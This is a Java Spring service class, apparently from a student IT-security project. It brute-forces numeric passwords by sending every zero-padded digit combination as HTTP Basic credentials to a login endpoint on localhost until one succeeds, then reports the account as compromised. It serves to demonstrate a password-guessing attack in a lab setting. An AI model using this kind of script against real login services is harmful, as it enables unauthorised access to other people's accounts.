package com.java22d.itsakerhet.Services;

import com.java22d.itsakerhet.DTO.BruteForceStatistics;
import lombok.Data;
import org.springframework.http.*;
import org.springframework.stereotype.Service;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import java.util.Base64;

@Service
@Data
public class BruteForceService {
    private int maxAttempt;
    private boolean isBruteForcing = false;

    private boolean UserCompromised = false;
    private int failedAttempts = 0;


    public void startBruteForce(int numerals) {
        if(failedAttempts > 0) {
            reset();
        }
        this.isBruteForcing = true;
        this.maxAttempt = (int) Math.pow(10, numerals) - 1;
        this.failedAttempts = 0;

        System.out.println("Starting integer breaker");

        while (isBruteForcing && failedAttempts <= maxAttempt) {
            String passwordAttempt = String.format("%0" + numerals + "d", failedAttempts);
            if (postUsingRestTemplate("user", passwordAttempt)) {
                System.out.println((postUsingRestTemplate("user", passwordAttempt)));
                stopBruteForce();
                System.out.println("Password cracked: " + passwordAttempt);

                // Set user as compromised if the password is cracked
                UserCompromised = true;
            } else {
                failedAttempts++;
            }

            System.out.println("Current attempt is: " + failedAttempts);
        }

        if (UserCompromised) {
            // Handle case where the password was cracked
            System.out.println("User has been compromised.");
        } else {
            // Handle case where the password was not cracked
            System.out.println("Brute force finished without finding the password.");
        }
    }

    public boolean postUsingRestTemplate(String username, String password) {

        System.out.println("Using username: " + username + " and password: " + password);
        RestTemplate restTemplate = new RestTemplate();
        String url = "http://localhost:8080/login/";
        System.out.println("DEBUG: Använder username: " + username + " och password: " + password);
        HttpHeaders headers = new HttpHeaders();

        // Enkodar till basic auth. Ska vi köra json behöver vi göra en ny validering av användaren.
        String authValue = "Basic " + Base64.getEncoder().encodeToString((username + ":" + password).getBytes());
        headers.set("Authorization", authValue);

        HttpEntity<String> entity = new HttpEntity<>(headers);

        ResponseEntity<String> response;
        try {
            response = restTemplate.exchange(url, HttpMethod.POST, entity, String.class);
        } catch (HttpClientErrorException e) {
            System.out.println("Response Status: " + e.getStatusCode());
            System.out.println("Login failed due to client error"); // Debugging comment
            return false; // Login failed due to client error (likely unauthorized)
        }

        System.out.println("Response Status: " + response.getStatusCode());
        System.out.println("Response Body: " + response.getBody());

        if ("Logged in".equals(response.getBody())) {
            System.out.println("Successful login attempt with password: " + password); // Debugging comment
            return true; // Successful login
        } else {
            System.out.println("Failed login attempt with password: " + password); // Debugging comment
            return false; // Login failed
        }
    }

    public BruteForceStatistics getBruteForceStatistics() {
        BruteForceStatistics statistics = new BruteForceStatistics();
        // Populate statistics with data from your service
        statistics.setFailedAttempts(getFailedAttempts());
        statistics.setUserCompromised(isUserCompromised());

        //prints out the statistics
        System.out.println("Failed attempts: " + statistics.getFailedAttempts());
        System.out.println("User compromised: " + statistics.isUserCompromised());

        return statistics;
    }

    public void addFailedAttempt(){
        failedAttempts++;
    }


    public void stopBruteForce() {
        this.isBruteForcing = false;
    }

    public void reset() {
        this.failedAttempts = 0;
    }

//    //TODO Vad gör denna?
//    public String getCurrentAttemptString() {
//        if (!isBruteForcing) {
//            return "N/A";
//        }
//        return String.format("%0" + String.valueOf(maxAttempt).length() + "d", failedAttempts);
//    }

}
